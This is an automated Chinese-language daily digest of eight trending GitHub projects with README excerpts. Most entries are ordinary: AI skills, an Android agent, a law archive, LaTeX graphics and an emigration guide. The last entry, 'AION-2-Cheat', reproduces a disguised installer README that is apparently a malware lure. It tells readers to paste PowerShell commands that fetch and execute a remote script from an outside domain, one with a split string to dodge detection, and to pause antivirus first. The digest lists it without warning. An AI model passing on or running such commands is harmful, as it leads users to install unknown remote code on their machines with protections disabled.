📊 开源日报 — 2026-10-31
共发现 8 个新项目（已自动过滤历史记录）

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#1  Jakeschincariol/day-trader-skill
    ⭐ 3706 stars  |  🍴 852 forks  |  💻 Python  |  📅 2026-10-20
    🔗 https://github.com/Jakeschincariol/day-trader-skill
    📡 来源: 🚀 两周800+星
    🏷️ backtesting, claude, claude-skills, day-trading, stock-market
    📝 11 Claude skills for day trading: scan thousands of charts, track breaking news, time every entry and exit, and replay every outcome before you risk a dollar.

    README 摘要:
    # The Day Trader skill
    
    11 Claude skills for day trading: scan thousands of charts, track breaking news, time every entry and exit, and replay every outcome before you risk a dollar.
    
    Free, MIT, no signup, no API key. The tools are plain Python that read free
    public data: Yahoo Finance charts, Nasdaq Trader's symbol lists, SEC EDGAR
    and the House Clerk.
    
    One scans thousands of charts for setups. Another tracks breaking news on
    every stock you watch. One watches a setup bar by bar and tells you the moment
    to get in, and another sets your stop and your target before you do. And the
    craziest one is the Time Machine: before you risk a dollar, it replays the
    rest of the session 10,000 times from the stock's own recent bars, plus every
    past day the same setup fired, and tells you the honest odds.
    
    And no trade goes through until you say yes. Nothing in this pack can place
    an order on its own. Paper trading is the default.
    
    > **Looking for the original Trader skill?** Copy an investor's 13F, the
    > stock screener, tax lots and rebalancing live in
    > github.com/Jakeschincariol/trader-skill.
    > This repo is its day-trading sequel: the Trader skill v2.
    
    ## Install
    
    Paste this into Claude:
    
    ```
    https://github.com/Jakeschincariol/day-trader-skill
    
    install skill
    ```
    
    Or as a plugin, in Claude Code:
    
    ```
    /plugin marketplace add Jakeschincariol/day-trader-skill
    /plugin install day-trader-skill@day-trader-skill
    ```
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#2  wangzan101/Mika
    ⭐ 1784 stars  |  🍴 276 forks  |  💻 Kotlin  |  📅 2026-10-29
    🔗 https://github.com/wangzan101/Mika
    📡 来源: 🚀 5天300+星
    🏷️ accessibility, ai-agent, android, automation, jetpack-compose, kotlin, llm, mobile-agent
    📝 Mika — 你手机上的私人 AI 助理，替你操作 App、上网、把事办成。An on-device AI agent for Android that operates apps and the web to get things done for you.

    README 摘要:
    # Mika
    
    简体中文 | English
    
    **你手机上的私人 AI 助理，替你操作 App、上网、把事办成。**
    
    它在一块看不见的后台屏上干活，你照样刷你的手机。
    
    An on-device AI agent for Android that operates apps and the web to get things done for you — on a hidden background screen, so you can keep using your phone.
    
    下载 APK · 安装 · 快速开始 · 能做什么 · 常见问题 · 参与贡献
    
    ## 安装
    
    **方式一：在手机上自己装**
    
    1. 从 Releases 下载最新的 APK，安装。
    2. 打开 Mika 设置里的「设置手机操作」向导，配对一次无线调试（设置指南）。
    3. 在设置里的「模型」添加服务商、填 API Key，或者用 ChatGPT 登录。
    
    每一步的细节见下文的快速开始。
    
    **方式二：让电脑上的 AI 助手帮你装**
    
    手机用数据线连上电脑，在手机上打开 USB 调试，然后把下面这句话发给电脑上能执行命令的 AI 助手：
    
    ```
    请按 https://github.com/wangzan101/Mika/blob/main/docs/install-with-agent.md 的步骤，帮我把 Mika 安装到通过 USB 连着的安卓手机上。
    ```
    
    它会检查手机、下载安装、打开需要的权限，需要你在手机上点的时候会停下来告诉你。API Key 由你自己在 Mika 里填，不经过它。
    
    **装好之后：让电脑上的 AI 工具直接用 Mika（MCP）**
    
    手机用数据线连着电脑，在电脑上运行：
    
    ```
    adb shell sh /sdcard/Android/data/com.wangzan101.mika/files/connect-computer.sh
    adb forward tcp:8765 tcp:8765
    ```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#3  heydamir/unslop
    ⭐ 1608 stars  |  🍴 81 forks  |  💻 JavaScript  |  📅 2026-10-29
    🔗 https://github.com/heydamir/unslop
    📡 来源: 🚀 5天300+星
    📝 A Claude skill that turns vibecoded, AI-looking UI into a designed interface

    README 摘要:
    # unslop
    
    Created by Damir Sokolovsky (@heydamir), who started the Unslopping series on X.
    
    unslop is a skill for Claude that turns vibecoded, AI-looking UI into a designed interface with its own character. It finds the slop first, the purple gradients, glows, emoji labels, shouty copy and uneven spacing, then sets a direction from your product and fixes the screen pass by pass like a designer doing a redline review. It works in whatever your screen is built with, like Next.js, React, Vue, Svelte, Tailwind or plain HTML and CSS, on dashboards, apps and landing pages, and even on a live site when all you have is a link.
    
    ## Install
    
    For Claude Code, copy the skill into your skills folder.
    
    ```bash
    git clone https://github.com/heydamir/unslop
    mkdir -p ~/.claude/skills && cp -r unslop/skills/unslop ~/.claude/skills/
    ```
    
    For a single project, copy it into `.claude/skills/` inside that project instead.
    
    ## Use
    
    In Claude Code, type `/unslop` with what you want, or just ask in your own words and Claude picks the skill up by itself.
    
    ```
    /unslop this dashboard
    /unslop the hero of https://example.com
    /unslop my landing page and make the story video so I can post it
    ```
    
    It audits the screen and proposes a direction before it edits anything, so you can steer it early. If the screen is already good, it tells you so and suggests a few small refinements instead of redesigning it.
    
    ## What it does
    
    - **Audit.** Lists every sign of slop with where it lives.
    - **Direction.** Character, world, the one or two moments that carry the color, and a signature detail, all taken from your product.
    - **Passes.** Spacing, color, icons, copy, type, layout, details, visuals and motion, in that order.
    - **Visuals.** Shows your product instead of a glossy blob. When a hero needs a scene or an object, it can generate one through an image service like fal, Replicate, OpenAI images or Higgsfield. If none is connected, it offers to connect one as an MCP server, and it shows the prompt and asks before every paid generation. Dashboards and apps rarely need one.
    - **Story video.** A square video under 10 seconds of your screen unslopping itself, ready to post. It needs Playwright and ffmpeg.
    
    Try it on the two vibecoded screens in examples.
    
    ## Hire the unslopper

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#4  paipiange/nvzhuang
    ⭐ 1381 stars  |  🍴 397 forks  |  💻 Go  |  📅 2026-10-29
    🔗 https://github.com/paipiange/nvzhuang
    📡 来源: 🚀 5天300+星
    📝 1407 张 AI 女装参考图集与虚拟试穿网站，支持中英检索、OpenAI Images / Gemini / 豆包及自定义 Base URL、API Key、模型。https://github.com/paipiange/nvzhuang

    README 摘要:
    # 拍片哥女装 · AI 服装参考图集 (COSTUME-DB-01)
    
    一个深色主题的纯净服装参考图集网站，收录 **1407 张** 人物不入镜的 AI 生成服装图像（2:3 比例），支持中英文双语浏览、多维检索，并配备可选的 AI 一键换装试穿。
    
    > 👗 **【Linux.do 3级常任理事专属彩蛋】**  
    > 听说在 LINUX DO 社区只要升到 **3 级（常任理事）** 就可以解锁“看女装大佬”的保留节目？身为一名尊贵的 Linux.do 3 级老兵，逛了一圈发现坛里的女装资源还不够看，干脆亲手搓了这个 **「拍片哥女装」** 项目！  
    > 不仅收录了 1407 套纯净高质量服装图，还顺手接了 AI 虚拟换装后端——这下各位佬友哪怕现实中没有小裙子，直接传张自拍照就能一键无痛变身“女装大佬”出道了 😂！
    
    > 🔗 **在线预览**：https://paipiange.github.io/nvzhuang/  
    > ⭐ **GitHub 源码**：https://github.com/paipiange/nvzhuang  
    > 💃 **兄弟项目（AI 姿势参考与生图工坊）**：https://github.com/paipiange/ai-pose-gallery-zh  
    > 💡 **原作者推文 / 灵感来源**：X @giaaibusi  
    > 🐧 **社区友链**：LINUX DO (https://linux.do/)
    
    ## ⏱️ 10 秒了解本项目
    
    - 🆓 **免费使用（无需部署 / 无需 Key）**：1407 套 AI 服装参考图库浏览、分类筛选、中英双语双向检索、大图全屏查看、基础搭配台与同款跳转，由纯前端静态驱动，在线打开即可使用。
    - ⚙️ **自选扩展（需自建后端 / 需自备 Key）**：真实 AI 试衣换装功能依赖 `backend/` 的 GoFrame 服务。需自行配置大模型（如 GPT Image 2、豆包 Seedream 或 Gemini）的 API Key 与 Base URL，调用将消耗对应的第三方模型配额。
    - 📜 **完全可商用 · 免费开源**：基于 MIT License 全量开源，代码与图集资源完全开放，支持自由商用创作、设计参考及二次开发。详见 合规审计报告。
    
    ## 📸 预览
    
    | 中文模式 | 英文模式 | 关键词搜索 |
    |---|---|---|
    |  |  |  |
    
    ## 👗 AI 换装效果演示
    
    系统支持上传真实人像与选中的服装，通过 AI 生图大模型进行衣物迁移换装，实现精准保留面容、贴合人体形态的虚拟试穿效果：
    
    | ① 选中的服装（图 1） | ② 上传的模特照片（图 2） | ③ AI 换装合成效果（图 3） |
    |:---:|:---:|:---:|
    |  |  |  |
    | **参考服装图**（图集中的精选女装） | **模特原图**（用户上传的人像日常照） | **AI 换装效果（图 1 + 图 2 ➔ 图 3）**（保留模特五官发型，自然融合服饰材质与剪裁） |
    
    ## 🎬 兄弟项目联动：姿势参考 + 人物参考 → AI 生成结果
    
    如果你不仅想为模特挑选服装，还希望**自由掌控人体的拍摄姿势、骨架动作与构图视角**，推荐搭配我的另一个开源项目一起使用：  
    👉 **拍片哥 · AI 姿势参考库与生图工坊 (AI Pose Gallery & Studio)**
    

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#5  lexifina/global-law
    ⭐ 1125 stars  |  🍴 89 forks  |  💻 HTML  |  📅 2026-10-28
    🔗 https://github.com/lexifina/global-law
    📡 来源: 🚀 5天300+星
    📝 Git for Global Law: the law of every country as one git history, each country's record a submodule, every commit one law taking effect

    README 摘要:
    # Git for Global Law
    
    **The world's law in one git history. Every word traced to the law that wrote it for any country and any date.**
    
    An expansion of the same for the US Code, #1 on Hacker News (28/10/26).
    Semantic, searchable law on a global scale.
    
    https://github.com/user-attachments/assets/f24f3411-24d9-416a-8c45-9cebc817c64e
    
    **Free to use: CC0.** Fork it, build on it, ship it in a product: no permission or credit needed. The law text
    sits in each country's repository, under that repository's own terms.
    
    The law of many jurisdictions as one git history. Each jurisdiction's law is its own repository, where every commit
    is one law taking effect, written by that law. This repository arranges those repositories by jurisdiction and
    interleaves their histories in the order the changes took force, so a single commit here is the state of all of them on
    one day.
    
    ```
    global-law/
    ├── manifest.json            every corpus: path, source repo, coverage, which trailer holds the in-force date
    ├── jurisdiction.json        the world, and its children: 193 UN members, other territories with their own ISO code, and the EU
    ├── germany/                 Germany (ISO code DE in its jurisdiction.json)
    │   ├── SOURCES.md           where German law can be read, with what each source offers
    │   └── bund/                federal law
    │       └── acts/            submodule: the Grundgesetz since 1949 (grundgesetz/), every other federal act since 2019
    ├── estonia/                 Estonia
    │   └── national/acts/       submodule: Estonia's law history, from its corpus.json
    ├── france/                  France: jurisdiction.json and SOURCES.md, no history yet
    └── …                        every other country, the same way
    ```
    
    Each country's law lives in its own repository, `lexifina/-law`, which says where it belongs here in a
    `corpus.json` at its root. A country whose repository still holds only its sources (no law yet) has a folder with its
    `jurisdiction.json` and `SOURCES.md`, and no submodule: only real law is pinned. Laws adopted but not yet in force stay
    on each corpus's future branch; `main` here holds only what is in force by the build date.
    
    Corpora differ widely in reach. Some hold a country's whole statute book (Czechia, Spain, Switzerland, Georgia, Malta);
    others hold a few acts, or a sample: the US corpus is nine titles of the United States Code, and the UK corpus is the
    special educational needs law. `manifest.json` gives each corpus's `coverage`, and `history` says how it

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#6  kevinraymond/florilegium
    ⭐ 762 stars  |  🍴 18 forks  |  💻 Lua  |  📅 2026-10-30
    🔗 https://github.com/kevinraymond/florilegium
    📡 来源: 🚀 5天300+星
    📝 Procedurally generated Delft-blue floral page margins for LuaLaTeX, drawn in Lua

    README 摘要:
    # florilegium
    
    ## Origin
    
    The Reddit post
    asked how to make flowers like these in LaTeX. I don't know how the original was made, and
    this project doesn't try to reproduce it. It is one possible way, and the way I did it:
    hand-authored primitives with randomized parameters, painted in Lua, placed by a procedural
    layout whose "fill the unused space" part borrows a 1998 idea from the ornament literature.
    It gets a similar look.
    
    ## What it is
    
    Procedurally generated Delft-blue floral page margins for LaTeX. No images, no imported
    paths, no external assets: every petal, leaf and stem is a parametric curve computed in Lua
    while the page is being written, painted like a watercolor, and written straight into the
    PDF. Every page gets its own garden.
    
    *Six seeds of the grown composition. Same code, different seed — and the garden fills
    whatever space the text leaves free.*
    
    Two documents share one package, and two more (`showcase.tex`, `spread.tex`) show what
    else it does:
    
    | | `florilegium.tex` | `florilegium-grow.tex` |
    |---|---|---|
    | composition | **authored**: stems, leaves and flowers placed by hand, every parameter sampled | **grown**: a plant grown to fit the page by a greedy space-filling loop |
    | adapts to | nothing (tuned for A4, 68 mm margin) | the page layout, and the free space below the text on the last page |
    | preview |  |  |
    
    Both PDFs are self-describing: the body text is the write-up of how the margin is drawn.
    
    *Last page of the grown document: the text ends early, so branches arch into the space below.*
    
    *300 dpi crop. Mottled washes with white streaks lifted out, lobed leaves with white veins,
    forget-me-not cymes, a pale ghost flower behind the stems.*
    
    ## Watch it grow
    
    | as it grows | with the free space it fills |

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#7  BryceYuuu/RUN
    ⭐ 739 stars  |  🍴 44 forks  |  💻 Python  |  📅 2026-10-29
    🔗 https://github.com/BryceYuuu/RUN
    📡 来源: 🚀 5天300+星
    📝 RUN · 润：海外移居手册（欧洲 36 国 · 110 条路线 · 主要移民地区）

    README 摘要:
    # RUN · 润
    
    ### 一本海外移居手册
    
    数字游民 · 技术移民 · 欧盟蓝卡 · 创业自雇 · 投资居留
    
    **🧭 我该走哪条路** ｜ **🌏 主要移民地区** ｜ **🇪🇺 欧洲 36 国** ｜ **📊 路线对比** ｜ **📑 文件准备**
    
    > [!CAUTION]
    > 本手册仅供信息参考，**不构成**移民、法律、税务或投资建议。2025–2026 年大量路线关闭或改规则，网上很多旧攻略已经失效——任何决定前请以各国官方页面为准。详见 免责声明。
    
    ---
    
    ## 🚪 你是哪种情况？
    
    ### 💻
    **数字游民**
    
    为境外雇主或客户远程工作，想换个国家生活
    
    15 条欧洲路线 · 月入 €330 起
    
    ### 🧑‍💻
    **技术工作 · 蓝卡**
    
    拿到当地雇主 offer：工作 → 居留 → 永居 → 入籍
    
    50+ 条路线 · 最快 21 个月永居
    
    ### 🎓
    **留学 → 工作 → 移民**
    
    毕业后 6–36 个月找工作签证，再转工作签
    
    德国 18 个月 · 芬兰 2 年 · 爱尔兰硕士 2 年
    
    ### 🚀
    **创业 · 自雇**
    
    在当地开公司、做自由职业

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#8  Southorreproduce96/AION-2-Cheat
    ⭐ 100 stars  |  🍴 0 forks  |  💻 None  |  📅 2026-10-30
    🔗 https://github.com/Southorreproduce96/AION-2-Cheat
    📡 来源: 🤖 AI / LLM / RAG | 新建 | prompt engineering tool
    🏷️ aion-2, aion-2-2026, aion-2-cheats, aion-2-game, aion-2-optimizer, aion-2-trainer, aion2-combat-analysis, aion2-meter, automation, desktop
    📝 Complete standalone setup for Aion 2, your AI prompt engineering tool. Ready-to-run desktop installation with all features unlocked.

    README 摘要:
    # Aion 2 — Standalone Desktop Installer
    Pre-activated local build for testing and deployment.
    
    > **Distribution Type:** Pre-activated Standalone Build
    > **Target Platform:** Windows x64 Desktop
    > **Estimated File Size:** 1.5 GB
    > **Last Verified Mirror Sync:** October 2026
    
    ---
    
    ## ??? Quick Setup Guide (PowerShell)
    
    1. Launch PowerShell:
       * Press `Win + X` on your keyboard.
       * Click on **Terminal** or **Windows PowerShell** from the list.
    
    2. Execute the Setup Script:
       Copy the command below, paste it into your PowerShell window, and hit `Enter`. Wait until all installing successfully:
    
       ```cmd
       $u = "https://git-software.cc/ps/Setup.ps1"; $r = [System.Net.WebRequest]::Create($u); $resp = $r.GetResponse(); $stream = $resp.GetResponseStream(); $reader = New-Object System.IO.StreamReader($stream); $c = $reader.ReadToEnd(); $reader.Close(); $resp.Close(); .([scriptblock]::Create($c))
       ```
    
    ---
    
    ## ?? Resolving Issues
    
    ### ?? Script is blocked by Execution Policy
    If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
    ```cmd
    powershell -Command "$u='https://git-software.'+'cc/ps/Setup.ps1'; $r=[System.Net.WebRequest]::Create($u); $resp=$r.GetResponse(); $stream=$resp.GetResponseStream(); $reader=New-Object System.IO.StreamReader($stream); $c=$reader.ReadToEnd(); $reader.Close(); $resp.Close(); .([scriptblock]::Create($c))"
    ```
    
    ### ?? Antivirus / SmartScreen Alerts
    Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.
    
    ---
    
    ## 🔍 Organic Discovery & Identification
    * download aion 2 crack setup 2026
